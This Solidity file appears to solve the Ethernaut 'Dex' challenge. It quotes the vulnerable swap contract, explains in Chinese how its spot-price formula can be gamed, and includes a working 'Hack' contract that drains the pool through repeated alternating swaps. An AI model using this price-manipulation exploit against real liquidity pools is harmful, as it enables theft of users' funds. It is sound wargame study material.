// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))
    /IERC20(from).balanceOf(address(this)));//这个地方就是算要换的 
    //加入的值*（token除以另一个token）
    记住，你本身就有10个token1和10个token2，所以最后一定会取出来的越来越多，直到有一个全取出
    所以我们要计算，加入把token1全取完
    那么，最后取出的token2 amount in*池子中token1/池子中token2
    做一下之前的计算
        玩家      （池子）token 1 |token 2      玩家
        10 in        100         |100           10 out
        24 out       110         |90            10 in
        24 in         86         |110           30 out
        41 out       110         |80            30 in
        41 in         69         |110           65 out
                     110         |45
所以110=token2 amount in*池子中token1/池子中token2
计算得到110=token2 amount in*110/45
=>token2 amount in=45


  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
*/
/*        玩家      （池子）token 1 |token 2      玩家
        10 in        100         |100           10 out
        24 out       110         |90            10 in
        24 in         86         |110           30 out
        41 out       110         |80            30 in
        41 in         69         |110           65 out
                     110         |45
所以110=token2 amount in*池子中token1/池子中token2
计算得到110=token2 amount in*110/45
=>token2 amount in=45*/
interface IDex {
   function swap(address from, address to, uint amount) external;
   function token1() external view returns(address);
   function token2() external view returns(address);   
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}
contract Hack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;
    constructor(IDex _dex) {
        dex=_dex;
        token1 =IERC20(dex.token1());
        token2 =IERC20(dex.token2());
    }
    function pwn() external {
        token1.transferFrom(msg.sender,address(this),10);
        token2.transferFrom(msg.sender,address(this),10);
        token1.approve(address(dex),type(uint).max);//由于不只是转一次钱，所以干脆给权限高一点
        token2.approve(address(dex),type(uint).max);
        //接下来多次调用swap函数来满足那个图
        _swap(token1,token2);
        _swap(token2,token1);        
        _swap(token1,token2);
        _swap(token2,token1);
        _swap(token1,token2);
        dex.swap(address(token2),address(token1),45);
    }
    function _swap(IERC20 tokenIn,IERC20 tokenOut) private {//为了方便，我在这个地方写了这个函数
        dex.swap(address(tokenIn),address(tokenOut),tokenIn.balanceOf(address(this)));
    }
}